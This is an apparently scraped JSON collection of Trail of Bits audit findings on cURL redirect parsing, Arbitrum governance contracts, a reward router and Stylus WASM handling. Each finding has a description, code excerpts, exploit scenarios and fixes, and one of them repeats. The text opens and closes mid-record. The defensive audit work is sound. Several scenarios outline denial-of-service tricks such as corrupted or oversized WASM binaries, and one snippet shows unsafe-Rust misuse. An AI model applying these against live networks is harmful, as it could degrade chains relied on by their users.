#0) > GET /?redirect=http://local.test:80?-123 HTTP/1.1 > Host: local.test > User-Agent: curl/7.86.0-DEV > Accept: */* > * Mark bundle as not supporting multiuse < HTTP/1.1 302 Found < Location: http://local.test:80?-123 < Date: Mon, 10 Oct 2022 14 :53:46 GMT < Connection: keep-alive < Keep-Alive: timeout = 5 < Transfer-Encoding: chunked < * Ignoring the response-body * Connection #0 to host local.test left intact * Issue another request to this URL: 'http://local.test:80/?-123?-123' * Found bundle for host: 0x6000039287b0 [serially] * Re-using existing connection #0 with host local.test * Connected to local.test ( 127 .0.0.1) port 80 ( #0) > GET /?-123?-123 HTTP/1.1 > Host: local.test > User-Agent: curl/7.86.0-DEV > Accept: */* > * Mark bundle as not supporting multiuse < HTTP/1.1 200 OK < Date: Mon, 10 Oct 2022 14 :53: < Connection: keep-alive < Keep-Alive: timeout = 5 < Content-Length: 16 < * Connection #0 to host local.test left intact HTTP Connection! Figure 14.1: Example logging output from cURL, presenting the bug in parsing URLs from the Location header, with port and query parameters $ curl -v -L 'http://local.test?redirect=http://local.test%23-123' * Trying 127 .0.0.1:80... * Connected to local.test ( 127 .0.0.1) port 80 ( #0) > GET /?redirect=http://local.test%23-123 HTTP/1.1 > Host: local.test > User-Agent: curl/7.86.0-DEV > Accept: */* > * Mark bundle as not supporting multiuse < HTTP/1.1 302 Found < Location: http://local.test#-123 < Date: Mon, 10 Oct 2022 14 :56:05 GMT < Connection: keep-alive < Keep-Alive: timeout = 5 < Transfer-Encoding: chunked < * Ignoring the response-body * Connection #0 to host local.test left intact * Issue another request to this URL: 'http://local.test/#-123#-123' * Found bundle for host: 0x6000003f47b0 [serially] * Re-using existing connection #0 with host local.test * Connected to local.test ( 127 .0.0.1) port 80 ( #0) > GET / HTTP/1.1 > Host: local.test > User-Agent: curl/7.86.0-DEV > Accept: */* > * Mark bundle as not supporting multiuse < HTTP/1.1 200 OK < Date: Mon, 10 Oct 2022 14 :56:05 GMT < Connection: keep-alive < Keep-Alive: timeout = 5 < Content-Length: 16 < * Connection #0 to host local.test left intact HTTP Connection! Figure 14.2: Example logging output from cURL, presenting the bug in parsing URLs from Location header, without port and with fragment Exploit Scenario A user of cURL accesses data from a server. The server redirects cURL to another endpoint. cURL incorrectly duplicates the query string in the new request. The other endpoint uses the incorrect data, which negatively aects the user. Recommendations Short term, x the parsing bug in the Location header parser. Long term, use a single, centralized API for URL parsing in the whole cURL codebase. Expand tests with checks of parsing of redirect responses.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "1. routeToken function may fail for certain ERC20 tokens ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-offchain-labs-bold-dac-rewards-updates-securityreview.pdf", "body": "The routeToken function can revert for ERC20 tokens that require the allowance to be set to 0 when calling the approve function, such as USDT. The function has an optimization where it approves amount + 1 to the gateway, which will transfer the amount of tokens in a following call. The idea is to never change the allowance storage slot from a non-zero to a zero value and saving gas. However, tokens such as USDT require the current allowance to be 0 when a user calls the approve function; in this case, this makes the routeToken function revert. function routeToken(address parentChainTokenAddr, uint256 maxSubmissionCost, uint256 gasLimit, uint256 maxFeePerGas) public payable { ... // approve amount on gateway, adding 1 so storage slot doesn't get set to 0, saving gas. IERC20(parentChainTokenAddr).approve(gateway, amount + 1); ... } Figure 1.1: Snippet of the routeToken function (src/FeeRouter/ParentToChildRewardRouter.sol#L162-L163) Exploit Scenario The ParentToChildRewardRouter contract is deployed with parentChainTokenAddr set to the USDT address. A user calls the routeToken function, but it unexpectedly reverts. Recommendations Short term, remove this optimization or use the forceApprove function in the SafeERC20 library after verifying that this function would still save gas. Long term, when developing a contract that interacts with ERC20 tokens, consider all possible dierent implementations and which implementations your contract should support. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "1. Discrepancy in comment about upgrade action ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-offchainarbitrum-securityreview.pdf", "body": "The upgrade action to set the sequencer inbox maximum time variation contains an incorrect comment. SetSequencerInboxMaxTimeVariationAction( ISequencerInboxGetter(0xd514C2b3aaBDBfa10800B9C96dc1eB25427520A0), // Arb One Address Registry 5760, // Delay blocks (same as current value) 64, // New future blocks value 86_400, // Delay seconds (same as current value) 768 // New future seconds value (delay blocks * 12) ) Figure 1.1: Sequencer upgrade action (AIPSetSequencerInboxMaxTimeVariationArbOneAction.sol#1319) The comment for the new future seconds value (768) should read (future blocks * 12) instead of (delay blocks * 12). Recommendations Short term, correct the comment in the upgrade action for both upgrade actions in Arbitrum One and Arbitrum Nova. 2. Unresolved TODO comments in NomineeGovernorV2UpgradeActionTemplate Severity: Informational Diculty: Medium Type: Undened Behavior Finding ID: TOB-ARB-SCE-2 Target: src/gov-action-contracts/AIPs/NomineeGovernorV2 UpgradeAction.sol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "1. Discrepancy in comment about upgrade action ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-offchainarbitrum-securityreview.pdf", "body": "The upgrade action to set the sequencer inbox maximum time variation contains an incorrect comment. SetSequencerInboxMaxTimeVariationAction( ISequencerInboxGetter(0xd514C2b3aaBDBfa10800B9C96dc1eB25427520A0), // Arb One Address Registry 5760, // Delay blocks (same as current value) 64, // New future blocks value 86_400, // Delay seconds (same as current value) 768 // New future seconds value (delay blocks * 12) ) Figure 1.1: Sequencer upgrade action (AIPSetSequencerInboxMaxTimeVariationArbOneAction.sol#1319) The comment for the new future seconds value (768) should read (future blocks * 12) instead of (delay blocks * 12). Recommendations Short term, correct the comment in the upgrade action for both upgrade actions in Arbitrum One and Arbitrum Nova.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "2. Unresolved TODO comments in NomineeGovernorV2UpgradeActionTemplate ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-offchainarbitrum-securityreview.pdf", "body": "The NomineeGovernorV2 upgrade action contains unresolved TODO comments that need to be addressed before a nal deployment and upgrade are possible. constructor() NomineeGovernorV2UpgradeActionTemplate( 0xdb216562328215E010F819B5aBe947bad4ca961e, 0x8a1cDA8dee421cD06023470608605934c16A05a0, address(0), // todo: new implementation 50400, 0x1D62fFeB72e4c360CcBbacf7c965153b00260417, 0x0101010101010101010101010101010101010101010101010101010101010101 // todo: new constitution hash ) {} Figure 2.1: NomineeGovernorV2 upgrade action (NomineeGovernorV2UpgradeAction.sol) Recommendations Short term, deploy the implementation contract, set the address in the constructor, and include the correct constitution hash.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "3. Unnecessary duplication in inheritance ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-offchainarbitrum-securityreview.pdf", "body": "The governance codebase contains several instances of duplicate inheritancea child contract inherits from a contract already in the inheritance tree of its parent. This may be necessary to control the C3 linearization of a contracts inheritance tree (but designs requiring this should generally be avoided). Since the following instances of redundant inheritance pertain only to virtual functions that are not overridden multiple times, the contracts that are repeatedly inherited can be removed (see appendix B). Inheritance duplication in L1ArbitrumToken: Initializable (already inherited by ERC20Upgradeable) Inheritance duplication in L1ArbitrumToken: ERC20Upgradeable (already inherited by ERC20PermitUpgradeable) Inheritance duplication in L2ArbitrumGovernor: Initializable (already inherited by GovernorSettingsUpgradeable) Inheritance duplication in L2ArbitrumGovernor: GovernorVotesUpgradeable (already inherited by GovernorVotesQuorumFractionUpgradeable) Inheritance duplication in L2ArbitrumToken: Initializable (already inherited by ERC20Upgradeable) Inheritance duplication in L2ArbitrumToken: ERC20Upgradeable (already inherited by ERC20BurnableUpgradeable) Inheritance duplication in L2ArbitrumToken: ERC20PermitUpgradeable (already inherited by ERC20VotesUpgradeable) Inheritance duplication in UpgradeExecutor: Initializable (already inherited by AccessControlUpgradeable) Inheritance duplication in SecurityCouncilManager: Initializable (already inherited by AccessControlUpgradeable) Inheritance duplication in SecurityCouncilMemberElectionGovernor: Initializable (already inherited by GovernorUpgradeable) Inheritance duplication in SecurityCouncilMemberElectionGovernor: GovernorUpgradeable (already inherited by GovernorVotesUpgradeable) Inheritance duplication in SecurityCouncilMemberRemovalGovernor: Initializable (already inherited by GovernorUpgradeable) Inheritance duplication in SecurityCouncilMemberRemovalGovernor: GovernorUpgradeable (already inherited by GovernorVotesUpgradeable) Inheritance duplication in SecurityCouncilMemberRemovalGovernor: GovernorVotesUpgradeable (already inherited by ArbitrumGovernorVotesQuorumFractionUpgradeable) Inheritance duplication in SecurityCouncilNomineeElectionGovernor: Initializable (already inherited by GovernorUpgradeable) Inheritance duplication in SecurityCouncilNomineeElectionGovernor: GovernorUpgradeable (already inherited by GovernorVotesUpgradeable) Inheritance duplication in SecurityCouncilNomineeElectionGovernor: GovernorVotesUpgradeable (already inherited by ArbitrumGovernorVotesQuorumFractionUpgradeable) Figure 3.1: Terminal output from script in appendix B Recommendations Short term, remove redundant inheritance and thoroughly test for regressions in the storage layout of upgradeable contracts. Long term, set and enforce coding standards pertaining to inheritance to avoid complexity and make future maintenance less burdensome. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "1. Gas for WASM program activation not charged early enough ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "The gas for activating WASM programs is not charged early enough in the activation code to prevent denial-of-service attacks. WASM activation is a computationally expensive operation that involves decompressing bytecode (gure 1.1). func (p Programs) ActivateProgram(evm *vm.EVM, program common.Address, debugMode bool) (uint16, bool, error) { statedb := evm.StateDB codeHash := statedb.GetCodeHash(program) version, err := p.StylusVersion() if err != nil { return 0, false, err } latest, err := p.CodehashVersion(codeHash) if err != nil { return 0, false, err } // Already compiled and found in the machine versions mapping. if latest >= version { return 0, false, ProgramUpToDateError() } wasm, err := getWasm(statedb, program) if err != nil { return 0, false, err } {...omitted for brevity...} } func getWasm(statedb vm.StateDB, program common.Address) ([]byte, error) { {...omitted for brevity...} return arbcompress.Decompress(wasm, MaxWasmSize) } Figure 1.1: WASM program activationrelated code in arbos/programs/programs.go#L84 and #L233 However, if Brotlis decompression fails, the user will not be charged for activating the program, which can be expensive. Exploit Scenario Eve creates a specially crafted compressed WASM bytecode with a corrupted bit at the end, with the purpose of slowing down the Arbitrum chain. The corrupted bit causes a failure during decompression, allowing her to avoid paying full price for her program, making her attack cheaper than expected. Recommendations Short term, charge gas as early as possible during WASM program activation; gas should be charged even if activation fails for any reason. Long term, review each computationally expensive operation that can be arbitrarily triggered by users to ensure it is properly priced.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "2. Project contains no build instructions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "The Stylus repository contains information regarding the project, a roadmap, and information regarding gas pricing, but it lacks other essential information. The repositorys README should include at least the following:  Instructions for building the project  Instructions for running the built artifacts  Instructions for running the projects tests Note that the repository contains a makele with convenient scripts; however, repositories of this size (e.g., involving a lot of dependencies and Git submodules) are often dicult to build even for experienced developers. Therefore, having building instructions and solutions to common build problems would greatly speed up developer onboarding. Exploit Scenario Alice, a developer, tries to build the Stylus repository; however, she faces problems building it due to the missing documentation in the README, and she makes a mistake in the procedure that causes the build to fail. Recommendations Short term, add the minimum information listed above to the repositorys README. This will help developers to build, run, and test the project. Long term, as the project evolves, ensure that the README is updated. This will help ensure that it does not communicate incorrect information to users.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "3. WASM Merkleization is computationally expensive ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "A WASM binary with a large global table (e.g., (table (;0;) 1000000 1000000 externref)) will require a few seconds of computation to iterate over and hash all table elements (gure 3.1). // Merkleize things if requested for module in &mut modules { for table in module.tables.iter_mut() { table.elems_merkle = Merkle::new( MerkleType::TableElement, table.elems.iter().map(TableElement::hash).collect(), ); } let tables_hashes: Result<_, _> = module.tables.iter().map(Table::hash).collect(); module.tables_merkle = Merkle::new(MerkleType::Table, tables_hashes?); if always_merkleize { module.memory.cache_merkle_tree(); } } Figure 3.1: A Merkle tree of all table elements being generated (arbitrator/prover/src/machine.rs#L1395-L1410) Exploit Scenario Eve creates a specially crafted WASM binary containing huge global tables, slowing down the chain. Recommendations Short term, reduce the number of table elements that a global table can have to speed up the module parsing process. Consider charging ink for this computation based on the number of elements hashed. Long term, review each computationally expensive operation that can be arbitrarily triggered by users to ensure it is properly priced.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "4. WASM binaries lack memory protections against corruption ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "Arbitrum compiles user program components to WASM to be run on the network. WASM binaries do not feature modern binary protections that are available by default in native binaries; they are missing most of the common memory safety checks and are vulnerable to related attack primitives (gure 4.1). Arbitrums compilation to WASM could introduce deviations between native and on-chain execution of a user program. Figure 4.1: An overview of the attack primitives and the missing defenses in the binaries The USENIX 2020 paper Everything Old Is New Again: Binary Security of WebAssembly describes in depth the binary defenses that are missing and new attacks that can be exploited in WASM binaries if memory-unsafe operations are performed. Other languages provide memory safety in the compiler. Therefore, code that executes safely natively with such checks may not execute the same on-chain. Exploit Scenario A user creates a Stylus contract using C/C++ that contains an unsafe memory operation. The user tests the code natively, running it with all the compiler protections enabled, which prevent that operation from being an issue. However, once the user deploys the contract on-chain, an attacker exploits the unsafe memory operation with a shellcode. Recommendations Short term, provide documentation advising users to use memory-safe languages. Additionally, advise users to perform extensive testing of any memory-unsafe code that is compiled to WASM to prevent exploitable memory issues. Long term, review the state of the WASM compiler to evaluate the maturity of its binary protections.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "5. Ink is charged preemptively for reading and writing to memory ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "Some host operations for reading and writing to a WASM programs memory charge ink before it is clear whether the operations will be successful or how much ink should really be charged. For example, in the read_return_data function, the user is charged for the operation to write size bytes at the start of the host operation. However, the data to be written is the returned data of size data.len(), which could actually be smaller than the originally provided size. If data.len() is smaller than size, the user will be charged more ink than they should be. pub(crate) fn read_return_data<E: EvmApi>( mut env: WasmEnvMut<E>, dest: u32, offset: u32, size: u32, ) -> Result<u32, Escape> { let mut env = WasmEnv::start(&mut env, EVM_API_INK)?; env.pay_for_write(size.into())?; let data = env.evm_api.get_return_data(offset, size); assert!(data.len() <= size as usize); env.write_slice(dest, &data)?; let len = data.len() as u32; trace!(\"read_return_data\", env, [be!(dest), be!(offset)], data, len) } Figure 5.1: Ink is charged for writing size bytes, even though the data to be written could be smaller than size. (arbitrator/stylus/src/host.rs#L273-L289) Exploit Scenario A WASM contract calls read_return_data, passing in a very large size parameter (100 MB). The EVM API, however, returns only 32 bytes, and the user is overcharged. Recommendations Short term, modify the read_return_data function to require the user to have enough ink available for writing size bytes but to charge ink for writing only data.len() bytes. Make similar changes in all host operations that charge ink preemptively. Long term, review the way ink is charged across dierent components and levels of abstraction. Make sure it is consistent and follows how the EVM works. Document any discrepancies in the charging of ink.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "6. Integer overow vulnerability in brotli-sys ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "Running cargo audit on the codebase reveals an integer overow vulnerability in brotli-sys, a dependency inherited in the Stylus repository. The dependency does not currently have an update available to x the vulnerability. Note, however, that the aected functions are not used. Dependencies should be kept up to date with any xes to reduce the surface of potentially exploitable code. If no xes exist for vulnerabilities in dependencies, the relevant area of the code should be clearly documented for developers, including explicit warnings about the vulnerabilities, to ensure that new code does not use vulnerable dependency code. Exploit Scenario Alice, an Ochain Labs developer, adds new functionality to the system that uses the brotli-sys streaming functions that are aected by the reported vulnerability, introducing an exploitable integer overow vulnerability into the codebase. Recommendations Short term, document the brotli-sys streaming functions that are aected by the integer overow vulnerability with clear warnings for future developers making changes in the system. Long term, add cargo audit to the continuous integration pipeline to ensure that new vulnerabilities are caught quickly. Moreover, continue to monitor dependencies and update them when new versions are available.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "7. Reliance on outdated dependencies ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "Updated versions of many dependencies of Arbitrum Stylus (and its submodules) are available. Dependency maintainers commonly release updates that contain silent bug xes, so all dependencies should be periodically reviewed and updated wherever possible. Dependencies that can be updated are listed in table 7.1, as reported by cargo upgrade through the cargo upgrade --incompatible --dry-run command. Dependency Version Used Latest Available Version thiserror libc eyre sha3 1.0.33 0.2.108 0.6.5 0.10.5 1.0.49 0.2.149 0.6.8 0.10.18 Table 7.1: Dependencies in the Stylus repository for which updates are available Exploit Scenario Eve learns of a vulnerability in an outdated version of a sha3 dependency. Knowing that Stylus relies on the outdated version, she exploits the vulnerability. Recommendations Short term, update the dependencies to their latest versions wherever possible. Verify that all unit tests pass following such updates. Document any reasons for not updating a dependency. Long term, add cargo upgrade --incompatible --dry-run into the continuous integration pipeline to ensure that new vulnerabilities are caught quickly. Moreover, continue to monitor dependencies and update them when new versions are available.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "8. WASM validation relies on Wasmer code that could result in undened behavior ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "The use of Wasmer code for validating WASM binaries could result in undened behavior. Stylus uses Wasmer to perform a strict validation of WASM binaries before activating them. For instance, the following function computes the memory oset for each WASM binary component: fn precompute(&mut self) { /// Offset base by num_items items of size item_size, panicking on overflow fn offset_by(base: u32, num_items: u32, item_size: u32) -> u32 { base.checked_add(num_items.checked_mul(item_size).unwrap()) .unwrap() } self.vmctx_signature_ids_begin = 0; self.vmctx_imported_functions_begin = offset_by( self.vmctx_signature_ids_begin, self.num_signature_ids, u32::from(self.size_of_vmshared_signature_index()), ); self.vmctx_imported_tables_begin = offset_by( self.vmctx_imported_functions_begin, self.num_imported_functions, u32::from(self.size_of_vmfunction_import()), ); Figure 8.1: The header of the precompute function in lib/types/src/vmoffsets.rs#L282309 However, this code relies on unsafe memory operations: it is not guaranteed that the memory pointers are properly aligned, and these pointers can be dereferenced later. Dereferencing of a misaligned memory pointer is undened behavior (gure 8.2). thread '<unnamed>' panicked at /home/fuzz/projects/audit-stylus/arbitrator/tools/wasmer/lib/vm/src/instance/mod.rs: 163:18: misaligned pointer dereference: address must be a multiple of 0x8 but is 0x51700005066c Figure 8.2: Undened behavior detected when trying to validate a WASM binary with a misaligned memory pointer A second, similar issue also exists in the version of Wasmer used by Stylus and can be found by cargo-careful, by running cargo +nightly careful test. Exploit Scenario A user submits a WASM contract that triggers a dereference of a misaligned pointer, which results in a crash or degraded performance. Recommendations Short term, modify the associated code to properly align the access pointers to ensure that no undened behavior is performed. Run related tests in debug mode in the CI pipeline. Long term, perform fuzz testing of the validation, activation, and execution of WASM contracts. Upgrade to the latest version of Wasmer, which contains xes for these issues, and integrate cargo-careful into the continuous integration pipeline.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "9. Execution of natively compiled WASM code triggers ASan warning ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "During the execution of natively compiled WASM code, certain code that handles exceptions could produce false positives in the AddressSanitizer (ASan) checks. Stylus allows users to compile WASM programs into native code and execute it, using Wasmer. While the produced native code looks correct, it seems to be incompatible with certain ASan checks on stack memory: ==1584753==WARNING: ASan is ignoring requested __asan_handle_no_return: stack type: default top: 0x7ffff106a000; bottom 0x7f7d88545000; size: 0x008268b25000 (560102264832) False positive error reports may follow For details see https://github.com/google/sanitizers/issues/189 ================================================================= ==1584753==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7f7d88546ab0 at pc 0x558196e7d273 bp 0x7f7d88546a90 sp 0x7f7d88546260 WRITE of size 24 at 0x7f7d88546ab0 thread T0 #0 0x558196e7d272 in sigaltstack /rustc/llvm/src/llvm-project/compiler-rt/lib/asan/../sanitizer_common/sanitizer_comm on_interceptors.inc:10100:5 #1 0x558196eaa3ef in __asan::PlatformUnpoisonStacks() /rustc/llvm/src/llvm-project/compiler-rt/lib/asan/asan_posix.cpp:45:3 #2 0x558196eb0417 in __asan_handle_no_return /rustc/llvm/src/llvm-project/compiler-rt/lib/asan/asan_rtl.cpp:589:8 #3 0x55819b933581 in wasmer_vm::trap::traphandlers::raise_lib_trap::h08f8319f19014fcd /home/fuzz/projects/audit-stylus/arbitrator/tools/wasmer/lib/vm/src/trap/traphandler s.rs:582:5 #4 0x55819b94b2c8 in wasmer_vm_memory32_fill /home/fuzz/projects/audit-stylus/arbitrator/tools/wasmer/lib/vm/src/libcalls.rs:584: 9 #5 0x7f7f1a400202 (<unknown module>) #6 0x7f7f1a40029b (<unknown module>) Address 0x7f7d88546ab0 is a wild pointer inside of access range of size 0x000000000018. SUMMARY: AddressSanitizer: stack-buffer-overflow /rustc/llvm/src/llvm-project/compiler-rt/lib/asan/../sanitizer_common/sanitizer_comm on_interceptors.inc:10100: Shadow bytes around the buggy address: 0x7f7d88546800: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x7f7d88546880: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x7f7d88546900: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x7f7d88546980: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x7f7d88546a00: 00 00 00 00 00 00 00 00 f1 f1 f1 f1 00 00 00 00 =>0x7f7d88546a80: 00 00 00 f3 f3 f3[f3]f3 00 00 00 00 00 00 00 00  Figure 9.1: The header of the ASan warning While we do not see an immediate risk, the resulting code should be compatible with ASan to make sure the execution of native code can be analyzed. Recommendations Investigate the reason for the ASan warning. We were unable to nd a recommendation for this issue before the end of the engagement.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "10. Unclear program version checks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "When a program is activated, the current Stylus version of the chain is used to compile and instrument the program. If activation is successful, the program state is updated to reect that version (gure 10.1). programData := Program{ wasmSize: wasmSize, footprint: info.footprint, version: version, } return version, false, p.programs.Set(codeHash, programData.serialize()) Figure 10.1: The program version is set in ActivateProgram. (arbos/programs/programs.go#L210-L215) Additionally, as shown in gure 10.2, programs may be reactivated to update the version after Stylus updates; this is useful as instrumentation may change between versions. func (p Programs) ActivateProgram(evm *vm.EVM, program common.Address, debugMode bool) (uint16, bool, error) { statedb := evm.StateDB codeHash := statedb.GetCodeHash(program) version, err := p.StylusVersion() if err != nil { return 0, false, err } latest, err := p.CodehashVersion(codeHash) if err != nil { return 0, false, err } // Already compiled and found in the machine versions mapping. if latest >= version { return 0, false, ProgramUpToDateError() } // ... } Figure 10.2: The program version check in ActivateProgram (arbos/programs/programs.go#L169-L184) However, the check in gure 10.2 (if latest >= version) implies that a program could have been activated using a Stylus version higher than the current one, which could be the case if the chains Stylus version is reverted to a previous one after a program is activated; in that case, this check would prevent that program from being reactivated and updated with the current Stylus version. This behavior in of itself does not necessarily have to be a problem; however, as shown in gure 10.3, a program can be called through the callProgram function only when the programs activation version matches the current Stylus version of the chain, which further contradicts the check performed by the activation function. if program.version != stylusVersion { return nil, ProgramOutOfDateError(program.version) } Figure 10.3: The program activation version is checked in callProgram. (arbos/programs/programs.go#L240-L242) Recommendations Short term, consider whether reactivation of a program should be allowed only when the programs activation version is dierent from the current Stylus version. This would allow reactivation exclusively when there is a version change; however, note that this might be undesired behavior and should therefore be thoroughly studied. Long term, document the intended ow for program reactivation under a Stylus version change and consider issues and edge cases that could arise when old programs are reactivated with a dierent set of instrumentations.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "11. Memory leak in capture_hostio ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "In the capture_hostio function, the RustBytes function new calls mem::forget, but the allocation is never freed, leaking memory. This may cause excess resource consumption; however, this code appears to be used only when tracing is enabled (presumably in debug mode). fn capture_hostio(&self, name: &str, args: &[u8], outs: &[u8], start_ink: u64, end_ink: u64) { call!( self, capture_hostio, ptr!(RustBytes::new(name.as_bytes().to_vec())), ptr!(RustSlice::new(args)), ptr!(RustSlice::new(outs)), start_ink, end_ink ) } Figure 11.1: The capture_hostio function leaks memory. (stylus/arbitrator/stylus/src/evm_api.rs#263273) Recommendations Short term, have the code explicitly drop RustBytes. Alternatively, use RustSlice, which rustc will automatically free. Long term, monitor the resource consumption of nodes. For memory managed purely in Rust, run the tests with cargo miri.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "12. Use of mem::forget for FFI is error-prone ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "The documentation for std::mem::forget states that using it to transfer memory ownership across FFI boundaries is error-prone. Specically, modications that introduce panics into code that uses std::mem::forget, such as the code shown in gures 12.1 and 12.2, may cause double frees, and using a value after calling as_mut_ptr and transferring ownership of the memory is invalid. The documentation advises developers to use ManuallyDrop instead. pub unsafe extern \"C\" fn arbitrator_gen_proof(mach: *mut Machine) -> RustByteArray { let mut proof = (*mach).serialize_proof(); let ret = RustByteArray { ptr: proof.as_mut_ptr(), len: proof.len(), capacity: proof.capacity(), }; std::mem::forget(proof); ret } Figure 12.1: The ownership of proofs memory is transferred to ret. (stylus/arbitrator/prover/src/lib.rs#368377) unsafe fn write(&mut self, mut vec: Vec<u8>) { self.ptr = vec.as_mut_ptr(); self.len = vec.len(); self.cap = vec.capacity(); mem::forget(vec); } Figure 12.2: The ownership of vecs memory is transferred to self. (stylus/arbitrator/stylus/src/lib.rs#8489) Recommendations Short term, use ManuallyDrop instead of std::mem::forget in the aforementioned code to more robustly manage memory manually. Long term, follow best practices outlined in Rusts stdlib and test the code thoroughly for leaks and memory corruption.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "13. Lack of safety documentation for unsafe Rust ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "The Rust codebases unsafe blocks lack safety comments explaining their invariants and sound usage. Furthermore, safe code and unsafe code are mixed in functions declared unsafe without distinguishing which blocks of code are unsafe. In future versions of Rust, this pattern may be agged as a warning or even a hard error. Generally, the code would be less ambiguous if unsafe code were explicitly separated into dedicated blocks even if the overall function scope is unsafe. The following output of running clippy -- -D clippy::undocumented_unsafe_blocks shows the unsafe Rust blocks in Stylus that lack documentation on their safety assumptions. ... error: unsafe block missing a safety comment --> tools/wasmer/lib/types/src/value.rs:32:29 .field(\"bytes\", unsafe { &self.bytes }) | 32 | | | = help: consider adding a safety comment on the preceding line = help: for further information visit ^^^^^^^^^^^^^^^^^^^^^^ https://rust-lang.github.io/rust-clippy/master/index.html#undocumented_unsafe_blocks error: unsafe block missing a safety comment --> tools/wasmer/lib/types/src/value.rs:41:17 | 41 | | ... unsafe { self.$f == *o } ^^^^^^^^^^^^^^^^^^^^^^^^ Figure 13.1: Output of the Clippy linter Unsafe Rust blocks should always contain safety comments explaining why the unsafe Rust is sound and does not exhibit undened behavior. Even if the code is not currently being used in a way that creates undened behavior, the current Stylus APIs can be used in an unsound manner. Consider the following example: let x = vec![1u8; 1000]; let y = GoSliceData{ ptr: x.as_ptr(), len: 1000 }; let mut a = RustBytes::new(x); unsafe { stylus_vec_set_bytes(&mut a as *mut RustBytes, y); } Figure 13.2: Example code allowing unsafe behavior Miri (a tool for detecting undened behavior) issues a warning on the code in gure 13.2: Undefined Behavior: deallocating while item [SharedReadOnly for <1851>] is strongly protected by call 812 Figure 13.3: Miris output when run on the code in gure 13.2 The stylus_vec_set_bytes function does not contain sucient documentation that covers this possible unsafe use. /// /// # Safety /// /// `rust` must not be null. #[no_mangle] pub unsafe extern \"C\" fn stylus_vec_set_bytes(rust: *mut RustBytes, data: GoSliceData) { let rust = &mut *rust; let mut vec = Vec::from_raw_parts(rust.ptr, rust.len, rust.cap); vec.clear(); vec.extend(data.slice()); rust.write(vec); } Figure 13.4: The stylus_vec_set_bytes function (stylus/arbitrator/stylus/src/lib.rs#201213) The unsafe write function also lacks documentation highlighting its possible misuse: unsafe fn write(&mut self, mut vec: Vec<u8>) { self.ptr = vec.as_mut_ptr(); self.len = vec.len(); self.cap = vec.capacity(); mem::forget(vec); } Figure 13.5: The unsafe write function (stylus/arbitrator/stylus/src/lib.rs#8489) The write function will leak memory if called consecutively without explicitly freeing vec, such as by using stylus_vec_set_bytes (gure 13.6), but this is undocumented. let one = vec![]; let mut two = RustBytes::new(one); unsafe { two.write(vec![1u8; 1000]); two.write(vec![1u8; 1000]); } Figure 13.6: An example of how write could be misused For functions that are called via Cgo, we recommend documenting where memory is allocated and whether the caller is responsible for manually freeing the memory or, in the case of Go, whether it will be garbage collected. Recommendations Short term, set the undocumented_unsafe_blocks, unsafe_op_in_unsafe_fn, and missing_safety_doc lints to deny. Long term, ensure that any implicit assumptions are documented in the code so that they are not forgotten.", "labels": ["Trail of 